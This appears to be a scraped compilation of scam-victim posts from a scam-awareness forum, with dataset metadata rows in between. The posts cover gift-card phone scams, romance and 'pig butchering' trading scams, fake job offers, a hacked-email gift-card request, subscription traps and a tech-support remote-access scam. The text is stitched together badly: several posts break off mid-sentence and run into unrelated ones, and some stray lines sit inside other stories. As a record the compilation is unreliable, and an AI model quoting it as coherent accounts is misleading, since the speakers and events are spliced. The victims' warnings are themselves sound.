SO what happened next was so dumb where they take me to like a sever where I had to type in the money to take out off my checking account or something and then they ended up sending me 2000$ and I freak out cause I even got a text on my phone and everything thing about and I start having an anxiety attack but the person I was talking to on the phone was taking advantage of me, playing nice just telling me to take an Uber to Walmart to get two Apple card to put 500 in each and then give them the money back, AGAIN I should have seen the red flag but I was so anxious I wasn't thinking right, I thought I was gonna go to jail, I did what they asked me I stayed o. The phone with them the whole time and gave them the number on the card and thought I fixed the issue, ONLY TO FIND OUT THAT THEY WHERE LYING TO ME THE WHOLE TIME
They told me not to tell my bank or family about it and if course I did and my dad called it out, which led to me locking my bank account and try to claim fraud.

I think what makes me angry is how I lost that money I was keeping in my savings for an emergency that is money I DO NOT TOUCH now I'm out of 1000 dollars, Vystar won't give me another debt card again cause of their bullshit rules and the people that took advantage of me get off scot free! This happened to me like less than a week ago

Look I don't know if people still read stuff on here or what this is gonna do for me this is more venting if anything, I honestly would love nothing more then to get my money back so I can have that security again, at the moment I don't have a job so money is hard to come by, fuckers didn't get enough of my money and tired to get some off my PayPal but I was able to get that back at least, they tried to put it all in Bitcoin.

Anyways again I'm just sharing/venting and trying to reach out to other who understand what I'm going threw, again I'm just mad that I'll never see that money returned back to me, I try to be as careful with my money as I can, I try not to spend to much and THIS is the thanks I get for it??

My mother(70s) called me today crying her eyes out. I don't think I've ever known her to cry so hard. She was a victim of these scammers. She didn't send money but she is absolutely heartbroken. She lost her husband a year ago. In her loneliness, she was talking to a man for a couple of months. We had no knowledge of it, as he told her he was in a very secretive position and if she told anyone, he could be killed. He was apparently to arrive to meet her, but just before his flight, something happened to him. He claimed to be a surgeon of some sort, I forget. His 'agent' called her and asked if he could get her help in retrieving him, he only needed x amount of money. She spoke to another relative who started being disrespectful, telling her it was dumb for her to believe this and from what I understand, berated her before walking out of the house leaving her in tears. That's when she called me. I wanted to convey to her that this other relative is not wrong. He just handled it horribly. I told her of the many scams that I've read about here. But I acknowledged her feelings. I let her know that I understand that she's been lonely, and this person drew her in. She calmed down and listened to what I had been telling her. After we ended our call she researched things online and later sent me a message saying that she appreciates me showing her this sub. That she also cut off communication with the guy and his agent. I'm still worried as she was devastated.

1572527734.0,My mom is being scammed and it's destroying our family,"I found out two weeks ago that my mother has been ""cheating"" on my father with a guy who randomly added her on Facebook that she did not know.   I know this guy has to be a scammer.  He claims he is part of NATO and is stationed in Syria.  She has convinced herself this person is real and that he will be returning to the US in the winter.  She has sent this person at least 6 phones, and all have been dispatched through international couriers. She claims that ""NATO is paying for her phone bill"".  In addition she took $20,000 from my father's savings (aka his total life savings) and sent it through FedEx.  She claims the money went to North Carolina.  I don't have a lot of information to go on to try and track down what is exactly happening because she is delusional and has deleted most evidence of the transactions off her phone.  My parents are currently going through a divorce because of this and she is trying to drain my father dry, and I know that whatever money she gets is going to this scammer.  Has anyone had a similar experience and how did you handle it?  I'm at a complete loss as to what to do.

Update:  Still no divorce.  My father called me yesterday to tell me he was giving her a second chance.  Of course, I flipped out.  He came to visit me today and told me a bunch of things.  One, she was back with him for one day and it became apparent to him that she 100% believes that she has not been scammed.  He took her to the AT&T store to cancel her account (part of the stipulation for him taking her back was for her to delete her Facebook and not have a phone with internet access).  She now has 11 phones/numbers associated with her account.  He told the people at AT&T what she had been involved in, they asked her who was paying for the phones and she said ""NATO"".   I think my dad needed to have that happen to see how far gone she really is and that he can't take her back.  I advised him to give her whatever she wants and be done with her.  Two,  he had the state police come to the house and take a report of what she had been doing with the phones.

Essentially, this guy who was scamming her was telling her that NATO needs phones so that the workers can call their families, but they can't get the phones themselves.  In exchange for her sending them the phones, NATO ""paid"" her phone bill (aka scammers gave her a random credit card traced to NC to pay the bill).  They then told her that they needed to ship phones to their family members in the US so that they could have a way to communicate with their lives ones overseas.   So different phones (bought by other people falling for the same scam) would be shipped to my mom and then dispersed.  

The $20,000 was sent because NATO had given my mom a ""special mission"" to help them get a package smuggled back into the US.  Essentially the money was being used to pay the ""smugglers"".   In return, this guy she was in love with would be able to come back to the US and be with her because his mission would be complete.

Importantly, **all three also appear in the message center on the website,** so it doesn't appear to be as simple as a spoofed email.

I have already taken the steps of logging out all sessions, changing my password, & enabling 2FA via Google Authenticator.

1660143545.0,"I fell for the ""Pig Butchering Romance"" Scam","Hi,

I wish I came across this when I was doing my research for my supposedly due diligence. 

I got romance scammed as well. I really thought I was careful, and I questioned everything yet, I got had. He contacted me via Facebook and was very friendly and respectful. He was not Asian though, the profile was of someone from the Netherland that moved to Texas, US. 

We had some great conversations, and he was sharing pictures and videos of himself and what he was doing all the time. He even shared that he has kids and showed me videos of them. His profile had posts from a few years ago with videos and photos. He talked to me about how he believes in fate and that he believed that God brought us together. Though I did not buy it at the time, on the subconscious level, I do believe in fate and In God. 

After consistent communication for a month, I started to get interested. And as I have been single for a while, I thought to myself why not? Then after another half month, he talked about how he has been gold spot trading and that it was very secure, and that he has a great experience. At first, I declined as I don't understand trading and I did not want to take the risk. He was not pushy at all. But from time to time, where it would come up organically, he would show me screenshots of his trades, they had few losses and big wins. And then I agreed that he teaches me how to trade. But thinking back, I misunderstood what teaching meant. It meant to just follow instructions but the way I thought about it was that he was going to give me actual lessons. 

I did search up the applications he asked me to download, MT5 and Newton and I did not find any red flags on them. He showed me how to use [mcpogroup.com](https://mcpogroup.com/) now called [mcpomarkets.com](https://mcpomarket.com/) to send money from Newton to the MT5 (Meta Trader 5). Until now, I know the instructions, but I don't really understand them. It seems that I did not do thorough due diligence. 

I started small to test it. I started feeling a false sense of confidence and control with each transaction. Throughout it all, he was explaining what to do clearly and skillfully answered all my questions. I even went and started to educate myself about gold spot trading as it was the only trade, he guided me through. Then, he told me that the last 2 weeks of July is a great opportunity to invest in the gold market, based on his analysis and his finance teacher, and it would be a shame to pass as he wanted me to improve my financial situation and he really cares and doesn't want me to miss it. And he even offered to match any contribution I was going to make to prove that it is safe. I hesitated for a while, and he wasn't pushy, but he did play me emotionally and psychologically and he convinced me that it was very safe and that I would have my money back and a lot more in a very short time. So, I fell for it and invested an additional $10K CAD for a total of $10,600 and he deposited $7K USD in the MT5 account shortly after I made my deposit and in a matter of a week and a half that turned to $100K USD, which was amazing in my view. 

Then he suggested that the data analysis he did, and his finance teacher confirmed, indicated that the market would be very bad and risky for the coming few weeks, and he suggested that I withdraw the money to which I agreed as I wanted to test the withdrawal for a while but somehow, I just did not. He walked me through how to request the transfer of funds from [mcpomarkets.com](https://mcpomarkets.com/) to the Newton crypto wallet. Again, I followed the instructions but still don‚Äôt understand them. 

It took a little longer to get the funds out than it took to transfer the money in and his answer to that, when I asked him why, was that I need to pass the audit. The next morning, I received an e-mail from [mcpogroup.com](https://mcpogroup.com/) telling me that my request for withdrawal was approved but with a caveat. They said that before getting the money, I needed to pay taxes on the profit which was 8% of approximately $86K USD of profit. I replied to them asking them to take it from the money they are holding and give me the rest. And they said no, I should make a separate payment. 

And here is where I got sure I was scammed. My heart fell into my stomach and felt so stupid, naive, and very gullible. And I discovered when I looked further that I fell for the ""Pig Butchering Romance Scam"". I tried to get him to give me the money to pay for the taxes and I will send it right back and he refused, saying that though he could help me, he wanted to see that I can handle such a small matter so that he is assured that our future together is a safe and will be a great one. Just typing that makes me want to vomit. 

I can't believe how naive I am. I haven't let him know that I figured it out. All the accounts are still open, and I still can see the money in the MCPO account. I am not sure if there is a way to get it out. All I want is my investment. Does anyone know if that is possible? Please help.",Malware,5068,965,116,0

He says he's 48 years old, that he has a fat bank account, that he is a US citizen, but was working in Turkey for the USAID (United States Agency for International Development). He said he was coming back to the US to meet her but he lost his wallet so his bank account is locked until he comes back to the US. He initially asked her for $1000, which she sent to him through CashApp. Then he said that he was attacked and had his finger cut off and then the hospital wouldn't release him until he paid his bill (as if a hospital could hold you prisoner until you pay). She sent him more money. Every time he says he's coming back to the US, something happens to where he can't come and she needs to send him more money. Because I have been adamant with her about him being a scammer, she stopped talking to me about how much money she has been sending him, but my daughter knows that she has been sending money to him at least once a month. I have known from the very start that she is being scammed. I have told her this multiple times. My husband, my daughter, my daughter's boyfriend, my mom's friends, and even her coworkers have all told her that she is being scammed. I don't know how to prove it to my mom. The only information I have is his phone number (which is a Google number) and a picture he sent her that is supposed to be his passport. I have searched the name on the passport with no luck. I have reverse image searched it, also with no luck. Are there any resources out there to help with this?

found an account on tinder of someone only 3km away from me whose bio said they were interested in hookups. it's been a few months since i've last had sex and i was in one of those phases where no matter what you do you feel overwhelmingly horny for weeks on end (is that a common thing or just me?). she had her snap in her bio so i messaged saying i was interested. she told me there was a $45 payment, and i was thrown off guard for sure, but i thought ""hey, it's only 45 dollars. she's really hot and i have enough to not dent my wallet with that."" paid the fee, waited until 8 when we were supposed to meet then everything went downhill.

she told me that she needed money for plan b and condoms before she came, and i really didn't want to send any more than i already had but i was admittedly desperate to not lose the opportunity. she had already sent nudes with her face in them and shared her live location that showed she was close to me, so i gave in and sent an extra 100.

after that she moved on to asking for gas money because her car was empty and she needed it to get to my place. at this point i gave up on humouring her and explained that i had already sent her $145 and that she could just use the money for gas and i'd pay off anything outstanding when we were finished. she insisted on having me transfer her more money and i kept saying no. i checked her tinder to double check things and it seemed like it accidentally bypassed some sort of filter because it showed that she was all the way in germany when i live in canada. she sent a snap of her outside and wouldn't you know it, it was pitch black out while the sky was still a bit blue over here.

eventually i just gave up, realizing i was fighting a losing battle and i'd be better off just holding off for the time being. the worst part of it all is since the money was sent online it was autodeposited so every cent was lost forever. i know losing $145 isn't gonna bankrupt me but i'm still super pissed off, both at her and myself. i let mysef get roped into giving away a good chunk of money for free and all i have to show for it is the shame and regret. just had to get this off my chest so i don't accidentally let it slip with my big mouth.

1588672146.0,Working as a scammer on fake dating site.,"Hello there, everyone! I've decided to join Reddit 'cause of this particular story that I was involved in and that is still upsetting me to a gread degree. Sorry for my english, it's my third language.

OK, so, let me start. I live in a not so nice city with huge unemploynment rate and, being a university student with no job, I always take any opportunity to work (well, not ANY, prostitution and drug dealing is not for me :D). 

So, when one day I saw a post from some company looking for a translator I wrote them with no consideration. 

And so I got to the interview.

The interview was ... Weird. It took place in a house similar to a residential one (usually offices of small companies and are located in places like that).

I was asked to come up with ""invites."" I asked what is it? And they answered me that these are ""special sentences to attract the attention of men."" Little by little I finally managed to find out what the essence of the work was. It was based on a site ""Vi\*toria Brides"". BUT! For the 'employees' it was different. ""Pr\*me Date"". I still don't know if these are different sites or the second one is just a covered up part of the first. Covered up from whom? From men. Men, usually in their 40-60-s are still using the ""Vi\*toria Brides"" to find love from Russia or Ukraine. They don't know that their ''loved ones"" don't answer them and probably don't even know english to begin with!

Also, there were only three female workers including myself. Others were young guys my age or older. So, when men were thinking that they were talking to a Elena from Ukraine they were actually talking to Vlad from Russia, yup.

At first I thought that I would be translating letters from men to women and back. But it turned out that everyone in office was given one or two accounts of different women to just...

Thanks in advance!","Hey guys, I've been applying for work from home jobs and finally got an interview with a company called Patton Air Conditioning. They use Telegram to communicate which I've heard scammers use, but I decided to continue with the interview anyway. The interviewer asked genuine questions about my experience and previous jobs, so I started doing some research on the company and everything seemed legit. 

After some time, they reached out to me and offered me a job as a representative caller for $27 per hour. Here's where I messed up - I sent a picture of my social security card and driver's license to the email address they provided. I didn't think anything of it at the time because my previous job asked for the same thing. 

But now, after reading some threads on Reddit, I think I might be getting scammed. They say they're going to send me a check for equipment and I need to pick it up from one of their partners across California. I've tried calling the company's website number, but no one is answering.

I got an email from my ‚Äúboss‚Äù today asking if I could run out and grab some gift cards as a reward for some of our employees. I‚Äôm an intern and I just started this job, so being eager to please I agreed to. He asked me to buy two gift cards for $500, and said he‚Äôd reimburse me when he got out of a meeting. I got them and sent them to him, and then he asked me to go get some more. That was when I realized something was off, so I messaged my boss through Slack to confirm and he told me he had not asked me to get any gift cards. 

It turns out, a scammer hacked my boss‚Äôs email and was able to figure out his name, my name, and all my contact information. So now I‚Äôm out $1,000, which is a lot of money to me considering I‚Äôm a broke college student. 

I contacted the gift card company, and they said there was nothing they could do. I called my bank, and they said they couldn‚Äôt do anything until the payment was fully processed (likely in the next few days), but even then they couldn‚Äôt guarantee I would get my money back. 

I‚Äôm at a loss for what to do. If anyone could give me any advice, I‚Äôd really appreciate it.

About two days ago, my roommate answered the door to someone with a letter stating that the application findmyphone has pinged their phone to our address. 

The letter said they would be contacting the police if we do not hand the phone over, but the thing is, we are all confused as to how the phone ended up in our house, supposedly. 

I say supposedly because this situation does not make sense. 

We only live next to two other houses. There's a main road that leads from the exit down past our house. We live off of a side road, and our house is the last house on the back of this road. I hope that makes sense, I don't really know how else to explain it. 

So, anyway, we contacted the people who left the note and they said they were going to the gas station that's near our house and it fell off the hood of their car. 

But they gave us their address and they live on the other side of town, no where near our house. Our house isn't even in the path to go to said gas station from where they live.

I guess my question is, can police get a warrant sorely based off an app pinging the phone to our location? do they need more proof that the phone is at our house? 

We've looked everywhere near and in the house for the phone and we cannot find it.

1564782376.0,eBay Macbook scam - Weliky Group,"I  had an elderly woman come in a few weeks ago to fix her broken macbook  pro she bought on ebay from a vendor called Weliky.  She claimed that  she had a 3 year warranty on the laptop, as I proceeded to explain to  her that the model she had was legacy (2011) and that there was no way  you could have any type of warranty on a used laptop, she started to  cry.

I looked up this vendor  Weliky on ebay and just could not believe what I was seeing.  This  Weliky was selling used macbook pros with deceptive tactics calling an  SSD drive SSD H, which is not a real SSD drive to begin with.  These  hybrid drives are some of the worst hard drives you can put into a  computer.  Weliky is also selling warranties on USED laptops with used  parts, which is illegal.  Also they are not listing specific models in  their listings claiming 2012-2014 models upgraded to 2019, which is also  deceptive.  You really don't know what your buying until it arrives in  the mail.

I  had a look at  Weliky's feedback and noticed he was buying used parts from other ebay  sellers, that's when I began to dig.  I purchased the laptop this  elderly lady brought in and sold her a new macbook pro.  I tore down the  laptop piece by piece and examined all the parts.  Little does Weliky  know that most components come with a serial number.  After running the  parts through a database I discovered that the screen, ram,  battery and  hard drive were all in fact used pulled from other devices which  explains why weliky is buying used components from other ebay sellers.

Upon  more research I have found out that the vendors ""Illinois Precision   Group"" and ""Highland Systems"" all stem from the state of Illinois.  I  noticed the pictures used in the listings looked the same so I ran a  Geo-tagging scan on the pictures from precision and highland and they  both matched the geo-tagging from weliky's listings.  So it is now known  that Illinois Precision and Highland Systems are both owned and ran by Weliky.  This is also illegal, you cannot own 3  companies and run them against each other competitively. .These guys get a lot of bad feedback and then convince buyers  to change the negative feedback into positive ones after ""upgrading"" or  buying back their own products:

These  3 negative reviews are just from the past week then they change to  positive, I can only imagine how many times they have done this in the  past year.   Also to mention that if you are doing more then $100,000 in  sales per year in apple products you must register with apple as an  authorized reseller, after speaking with my superiors at apple neither  of these 3 companies are registered with apple to resell apple products.   Apple also mentions that anyone repairing apple products must be a  certified apple technician that has any interest in the companies and  apple has verified that neither of the owners are a certified  apple technician.  After documenting my findings and taking a statement  from the elderly woman who wishes to remain anonymous on this board, I  have contacted the FBI Fraud Dept in the Northern Illinois District and  turned over all documents and evidence as well as the IRS, Apple, the BBB, Ebay and Paypal.  The charges they are facing are defrauding an  elderly person using interstate commerce, violating Section 5 of the  Federal Trade Commission Act, which bans ‚Äúunfair methods of competition‚Äù  and ‚Äúunfair or deceptive acts or practices"", selling fraudulent  warranties and selling counterfeit merchandise in interstate commerce.   In order to refurbish an apple laptop one must use brand new original  certified apple parts if not the item is deemed counterfeit.

So  far we have made 3 controlled buys from Weliky, Illinois Precision and  Highland Systems and after dissecting each component it is fully  confirmed that they are using used or possibly broken parts reselling as  new.  I am a certified Apple Tech at Apple out of New York City where  we have filed criminal complaints in the Federal Southern District of  New York and Northern District of Illinois.  I advise that all other victims of Weliky also known as Illinois Precision  Group and Highland Systems to come forward with their claim as we are  also putting together a lawsuit against the defendants.  If anyone has  any questions or complaints please contact the FBI Fraud Dept. in the  Northern District of Illinois and the Southern District of New York.   Thank You",Malware,5506,866,74,0

After my resume was built the pdf was watermarked heavily and put behind a paywall. It was only like 2-3 dollars and I spent a good while making it so I figured I might as well buy it once so I could have my resume I spent all that time on. Or it wanted me to sign up for a free trial. Either way I‚Äôd do it and cancel the subscription. After I printed it out and saved the pdf I thought I cancelled the subscription. It asked me if I was sure and I said yes. Then It said I successfully canceled my subscription. Fast forward to today. I look in my bank app and see $23.85 come out of my account. I find out it‚Äôs from resume now and I go to the website and it says I‚Äôm still subscribed. I go to look at account info and it shows that I‚Äôve made 5 of those payments of 23 dollars for the past 4 months. I‚Äôve only used the service once so obviously I want a refund. I go to cancel my subscription first and it asks if I‚Äôm sure. I click yes. Then it asks if I want to change the subscription to add more services. I click cancel anyway. It asked me the same thing again. Then again. Then it finally sent me an email confirming that I cancelled. I know for a fact that I cancelled the first time. I look at the reviews and see that I‚Äôm not the only person this happened too. Hundreds of other people have said that they‚Äôve cancelled and still have been charged without realizing it. Which makes me think that when the account goes to cancel the first time it pretends it goes through but after a while it goes back to being active. Dirty trick. One of the reviews say that they lost 300 dollars and only got 3 payments refunded. I talked to the billing department and they said they would refund one whole payment but originally only would do half a payment. And I got and email after a couple hours saying they would refund me the half payment. I gave up because I knew I was done with the subscription and they said I wouldn‚Äôt be charged anymore but I‚Äôm watching my account like a hawk now

1680030031.0,Art Scam Alert - Trinity Insurance & Financial Consultaion,"I found this job on LinkedIn which basically entailed that this ‚Äúcompany‚Äù was looking for 10 drawings to be used in an ad for the business. I applied for the position and the next day was reached out by their ‚ÄúPresident‚Äù Nelson Tate. He said that he was very impressed with my portfolio that I had online and asked if we wanted to work together and gave me his email.

We corresponded, and I told him I was interested in working with him. He offered me a STUPID amount of money for this job, with each drawing costing about 1002.30 USD. I was flabbergasted because I needed money as I‚Äôm moving to a different state, and I would also love to beef up my resume. I‚Äôm a freelance illustrator that graduated from college a year ago; this would‚Äôve been huge for me. 

However, my guard was up. I had remembered a video on TikTok about scam happening to one of my art friends. My friend was approached by a ‚Äúcompany‚Äù looking to pay them an exorbitant amount of money for a few drawings. If my friend would‚Äôve cashed the checks, the client would‚Äôve backed out halfway through their deal due to a ‚Äúfamily emergency‚Äù and ask for the money back. If my friend had sent them money, the would‚Äôve bounced their checks, sending my friend into so much debt with the bank. 

I did try and look up the company and the president online to see if it was too good to be true. Sure enough, there was a website for a ‚ÄúChristian-lead insurance company‚Äù called Trinity IFC but it was not the first insurance website to pull up on Google. It was the second option. I had even tried to look up ‚ÄúNelson Tate‚Äù on LinkedIn again to find that his profile was deleted off the site. However, I gave him the benefit of the doubt, thinking that he only applied to the website to advertise the job and then move on ‚Äî which was stupid of me.

‚ÄúNelson‚Äù asked me to drum up a contract, which I did and then he said he‚Äôd send me a check with the money. He ended up mailing the ENTIRE AMOUNT (and then some) and emailed me saying that he needed the extra $6,438.38 back to pay a DIFFERENT artist working on a different project. That‚Äôs when I knew for absolute certain that it was a scam.

I just finished an interview with a ‚ÄúMarketing‚Äù company called Pivot Marketing located in Coral Gables, Miami, Florida.

I'm taking my time to alert other people about this organization and don't waste your time.

I am a father of a family looking for a job opportunity to support my family. I applied for several jobs and these people contacted me the day after applying. I was excited. I had a first interview with 4 other girls via zoom.

The first alert was that my appointment was at 12pm and I received 2 texts confirming the interview, but in the last text the time changed suddenly. It said 2pm. But It's ok, I needed the job so I made the necessary changes. This interview was with Mrs. Naroa Mena, from Spain, ""CEO"" of this organization. After that interview where they asked general and simple questions, they told us that they were going to select the candidates who will go on to the next round of interviews.

They didn't take more than 30 minutes before they were already calling you and congratulating you on making it to the next round. They gave me an appointment for the next day at 8.15am. I was there today Punctual!

This second interview was conducted by Mr. David Moreno, Colombian and Assistant Manager. It was more extensive. 30 - 40 min Approx. There, he explained the different levels of ""work"". He said they help Non-profits companies raise money for their causes.

The first level is ‚Äúcampaign Developer‚Äù where they say you earn between $400 - $600 plus bonuses.

Second level ‚ÄúMentorship‚Äù $600-$900 plus bonuses.

Third level ""Assistant Manager"" $2000 per week.

And then ""Regional Director"" approximately $100,000 a year.

I asked him a question to which his answer was not very convincing.

What were they based to determine the exact salary of each level? His answer was ""performance"". That is to say, depending on what you sell and do, they ""pay"" you more or less.

Anyway, I did my research afterwards and found a blog from someone who went through exactly the same thing. Here I give you the link:

After everthing was laid out regarding the piece, they said they'd pay 50 percent in advance as security deposit and asked for my Paypal and name on my account. A few minutes later I get an E-Mail fom what looked like Paypal, claiming I didn't have a business account and the client has to send another 100 bucks which I immediately have to send back and let Paypal now so they'd forward me the 250 Dollars. However, the ""client"" then gave me a completely different Paypal that wasn't even in the same language. Her name on insta sounded English, maybe American, the one she wanted me to send the 100 Dollars to was all in Kanji. I was stupid and sent it. Being on my phone I didn't see the whole email, otherwise I would have seen right away that it was actually a gmail account and that it looked odd. So all I saw in the adress was PayPalservice, written exactly like this. Add to that a stressful week in general....well. But anyway, she then told me she couldn't send me confirmation because she didn't have access to her account and wanted me to send another 100 to yet another paypal account at which point I finally had the sense to step back a bit and not do anything for the moment. She even had the nerve to tell me where to report it on paypal so I could get a refund. But having it set to friends and family, protection didn't apply of course. So for now I sent the fake mails to Paypal's security and contacted my bank for a charge back.

As of now she's still trying to contact me, repeatedly asking if I got the refund.

Hope this helps, stay safe, don't be stupid like me.

Edit: Added schreenshots of the mails.

1697588657.0,"What type of scam is this? And how did the scammers get my email? Frequent multi-duplicate emails from companies I never interacted with, no suspicious activity in my bank account","I have two cases of this with different email accounts. One is recent, the other has been going on for over a year and my email account is such a mess because I get so many of these emails. 

The older spam emails look pretty authentic but since unsubscribing isn't straightforward, I assume it's still spam. That goes to the spam folder automatically. However, it's still a nuisance because I get so many; they are sent from multiple subsidiary brands of the same corporation. These emails started after I sent a message to a domain admin address. It turned out it was for sale by a career domain reseller (I don't know what this is called). They sounded like a regular if jerky person. After that, the spam emails from an unrelated established retail company started coming in (I think they're general sale alerts, not ""buy"" links). I never signed up to anything from them and I normally don't subscribe to anything. That email address was pretty new, mostly inactive, and completely free of spam before this. 

The new spam is definitely inauthentic, though it does try very hard to appear real. (These are sale alerts too, but I think they do link to a list with pricing.) Unfortunately, I realized this only after clicking the unsubscribe link that does not work. Though this account is active and has existed for years, I'd rarely gotten any spam at all until this recent wave. This bunch was marked as spam. The second batch came in through the spam folder. But the third batch appeared in my inbox again. 

There are some (quite old) threads that discuss mass-spam emails, but they're in a much greater volume of messages. The motive for them was assumed to be for hiding bank charges. I haven't seen any suspicious activity in my bank account. 

I've checked my emails for breaches and there was nothing found.

I was able to recover the page I created, the hacker had attempted to delete it, but Facebook gives 30 days before they delete pages permanently, and the page was scheduled for deletion, and I recovered it and helped her recover her pages as well.

1697562000.0,Is this job a scam?,"I've been contacted on WhatsApp for a job which is: Data Provider User.

It never happend before, so I was pretty suspicious about it. The person came to me after ""receiving"" my job application, but I can't remember sending any job application to the company she was talking about, and when I asked where and when she received it, she didn't answer.

The first thing that was weird is: the person that contacted me didn't took care of explaining the job, she sent another person which is apparently doing the same job. This person could answer every question I had, but never precisely. When I asked about the different tasks I will have to do, he answered with:

""What we need to do is to operate on the (company) workbench and help these apps increase their popularity, reviews and ranking. When theses app's rankings improve, more people can know and use them. If you want to work with us, I will provide you with a (company) link application to create an account. You simply log into your (company) account with your phone or computer to start doing the task through the system.""

What got me even more suspicious was the salary: 800 USDT for 5 days???? + extra commission per day. But the job only needed 30-60mn a day.

Third thing: To get the job, I have to get a training (which is free) and even get a commission after doing the training! When I asked what was the training about, he said:

""I will train you how to do the task in the workbench and how to convert USDT into EURO and help withdraw your commission to your bank account"".

And last thing, the person  really insisted on me doing the training to understand. The whole conversation was pretty unprofessional, and when I said that I had no time to do the training today, he asked me why. Like if I was busy or something. Normally, you don't ask people personnal question for a job application.

I'm pretty young and desperately searching for a job in my country, so maybe this sound really dumbs but I wonder if I just passed an eventual great opportunity to make money, or if I was right to follow my guts.

And this is what the page says, it goes on and on, but this is just a snippet. I call this bullshit and a fake, but you guys can tell me 

don't mean to upset you, but I noticed something bad... really bad and dark going on with your energy. When I performed a ritual and observed your soul closely, I found out that something's going wrong. This may shock you, but I must reveal this...

You are under the cast of nasty Bad Luck that's sucking the stability out of your finances. This Bad Luck Energy is almost like a spell that is affecting your chances of becoming financially free. I can feel that you are unable to attract the good fortune that I saw for you coming recently. You've missed many chances for success and creating a crazy amount of wealth because of this bad luck energy that's been stuck in your soul for so many years now.

I had a clear vision that showed you with all the riches, happiness, and emotional peace in your life, but your situation is far from reality. The vision was a sure shot no error prediction, and yet I see you struggling every day.

How did you become a victim of vicious Bad Luck?

There are a lot of energies in the Universe that keep wandering around the earth plane, and some of them are extremely harmful to the human soul such as this. When I looked closer I got to know that these negative energies were instilled in some other person, but you came in contact with that person around July 17, 2016.

You don't know this person. Either you touched their body or crossed through their Aura without having energy protection, and that's why you got immediately affected by this ghastly energy. From that day onwards, everything went south and happiness started fading away from your life. Tell me... Isn't this the truth? Of course, it is. I know what you have seen in the past few years and let me say this... If nothing is done now, things will be even worse! You can...

As it's always a PITA to keep the live chat open I figured it would be easier to try it on WhatsApp, so I messaged the number with a phrase they presumably use to start conversations.

After initial chatter with the bot, it put me through to an ""expert"" but then the conversation got a bit weird. They told me my account had no security question or password (it does) and the grammar is really off. The ""kindly"" really made me suspicious about the authenticity of this. I gave them some bogus information and that was that, they updated me on the status of my fault (but it was a pretty generic thing that is applicable to any internet problem). I haven't ever had to enter this new password. Messaging this WhatsApp since, it now just gives an automated message to go to the live chat (which is odd, why would I need to go back?). Looking at the number, it is a mobile number which is strange. It's listed as a business account but I don't know how hard something like that is to set up.

He called the ""dealer"" talked about the machine, and was told they offer free shipping up to 1000 miles, and then a dollar a mile beyond that. When I heard this I immediately thought this was a scam, so I said I'd look into it, my friend sent me a link to the dealers website, which is poorly put together, has an improper pluralization in it  and has a major spelling error throughout it, I tried to do a reverse image search on the one of the photos from the site, and unsurprisingly this is being advertised from coast to coast, often with unnecessary words in the description. Now, for the reasons I have even the slightest thoughts this could be legit,  I checked google maps to the address on the website, and it checks out, you can read their sign from street view, they have a Facebook page, made last December, which is similar in scope to some other dealers I know, the LLC (with that name, at that address) is in good standing with the state SOS,  the price for the tractor, while quite low, isn't entirely unrealistic.

1697505144.0,Looking For An Outside Opinion,"Hello there!

Old star wars references aside, I'm in a *very* odd situation, so I'll do my best to summarize:

I was looking to buy a new GPU for my computer, and ended up finding a pretty good deal on FB Marketplace. I did some account snooping to see if the seller seemed legitimate, and once we started talking, things seemed fine. She was quick to respond, and overall just seemed quite nice and straight to the point. I send her the money, and she tells me she'll get back to me later on in the day with a shipping-id. 

More than a day goes by and I hear nothing. I text her, doesn't even read it. Eventually I begin to accept that I've been scammed, and then suddenly she comes back and says she just shipped it, but the shipping-id? No, that would come later in the day. Instead of sending me that, she asks for a screenshot of the transaction (which I had already sent her during the initial payment). 

Since then she hasn't even read my messages where I basically start to politely ask her why she isn't reading or updating me. 

Around two weeks later, so roughly yesterday, I write to her and the phone number I sent the money to, essentially saying that they have 24 hours to pay me back my money or I'll contact the police and bank. The FB sees nothing change (and by now I'm pretty sure the account is hijacked), but through SMS, the story is different.

This part is where things get confusing. First of all, the number I sent the money to was supposedly the number to the daughter, whom was the supposed owner of the card, that her mom was selling for her. So, this daughter's boyfriend contacts me and initially claims that they've also been scammed by the same guy (?), and that they don't know who the seller is (this is confusing, I know). Playing dumb, I write that I understand and that I'll go through with contacting the police and bank on my own. Only then does he call me, and this part is super fucking confusing:

He claims that his friend owed him money, which was sent to the ""daughters"" number, and therefor implies that his friend is the one responsible for the scam. He goes on to say that he'll make sure to give me back my money in around 6 days. He claims that if I lived close to where he is that he could hand me the money in physical cash, but cannot send it because he doesn't have what's required to do so (presumably no bank account). Following this, he sends me a text at 01:00 in the morning, telling me that the person who set up the scam initially will call me tomorrow, which is where I'm at right now. 

I'm sorry if this made no sense, as I can barely understand the situation myself. The way I see it is that the scammer got scared when I threatened them with the police/bank, and now either wants to stop me by sending the money back, or stalling for time to find a way out of this somehow. I just... I sent the money to the daughter, so how the money could end up in the friend's hand is beyond me. Just writing all of this has killed like 99% of my braincells.",Malware,3015,574,88,0
1697503508.0,FIL scammed in Phishing attempt - what to do?,"Greetings.

Got a text from my FIL today - ‚ÄúI think my computer was hacked‚Äù

Laughed and figured something he couldn‚Äôt intuit came up and didn‚Äôt think much of it.

Turns out, he was. 4 days ago Hulu was giving him issues and an error code on his fire stick. He googled the error code and he ended up clicking on a non-Hulu affiliated link. It was a phishing site and he was tricked. FIL called the number and ended up being directed on to his computer by the scammers and they had him go to a website and allow them to control his computer.

FIL got wise after 30 minutes into the phone call and realized something wasn‚Äôt right. He ended the call and signed out of his computer - put it in sleep mode.

Today, he went out for work and came back and there was a blue screen that said something along the lines of ‚ÄúDo Not Shot Down. Your computer is being fixed‚Äù he realized that this was wrong and shut down the computer. The computer turned back on and he had the smarts to put it in airplane mode and remove internet access.

They put two orders in for Netflix gift cards on his Amazon account. The first order - they must have messed up, it was for a physical $100 gift card and it was to be shipped to my FIL‚Äôs address. It was canceled by the scammers 5 min later and a digital $50 gift card was purchased. I think that this was canceled by him, but I‚Äôm not clear on that.

He‚Äôs changed his Amazon, Gmail, and Windows login info, and had his CC the Amazon purchase went through replaced with a new card. And the computer remains in airplane mode. There was likely sensitive personal information on his computer that they may have accessed, but don‚Äôt know if that‚Äôs the case.

